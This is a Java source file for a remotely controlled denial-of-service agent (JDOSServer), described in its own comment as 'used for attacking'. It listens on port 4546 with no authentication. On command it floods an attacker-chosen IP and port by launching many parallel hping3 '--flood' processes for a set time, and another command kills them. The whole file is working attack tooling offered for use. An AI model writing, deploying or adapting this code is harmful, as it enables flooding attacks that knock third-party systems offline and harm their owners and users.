package com.jdos;

import java.io.DataInputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;

/**
 * A JDOSServer used for attacking.
 * 
 * @author Desmond Jackson
 */
public class JDOSServer extends Object {
	
	/**
	 * The main method.
	 * 
	 * @param args String arguments
	 * 
	 * @throws IOException
	 */
	public static void main(String[] args) throws IOException {
		ServerSocket ss = new ServerSocket(4546);
		while (true) {
			final Socket s = ss.accept();
			new Thread(new Runnable() {

				@Override
				public void run() {
					try {
						DataInputStream din = new DataInputStream(s.getInputStream());
						if (din.readInt() == 0) {
							String ip = din.readUTF();
							String port = din.readUTF();
							String method = din.readUTF();
							final int time = new Integer(din.readUTF()) * 1000;
							din.readInt();
							din.close();
							s.close();
							final String[] command = new String[] {
									"hping3",
									ip,
									"-p",
									"" + port,
									"--" + method,
									"-d",
									"120",
									"-w",
									"64",
									"--flood",
									
							};
							int threads = Runtime.getRuntime().availableProcessors() * 4;
							for (int i = 0; i < threads; i++)
								new Thread(new Runnable() {

									@Override
									public void run() {
										try {
											Process process = Runtime.getRuntime().exec(command);
											Thread.sleep(time);
											process.destroy();
											process.waitFor();
										} catch (IOException e) {
											e.printStackTrace();
										} catch (InterruptedException e) {
											e.printStackTrace();
										}
									}
									
								}).start();
						} else {
							din.readInt();
							din.close();
							s.close();
							String[] command = new String[] {
									"killall",
									"-9",
									"hping3"
							};
							Process process = Runtime.getRuntime().exec(command);
							process.waitFor();
						}
					} catch (IOException e) {
						e.printStackTrace();
					} catch (InterruptedException e) {
						e.printStackTrace();
					}
				}
				
			}).start();
		}
	}

}
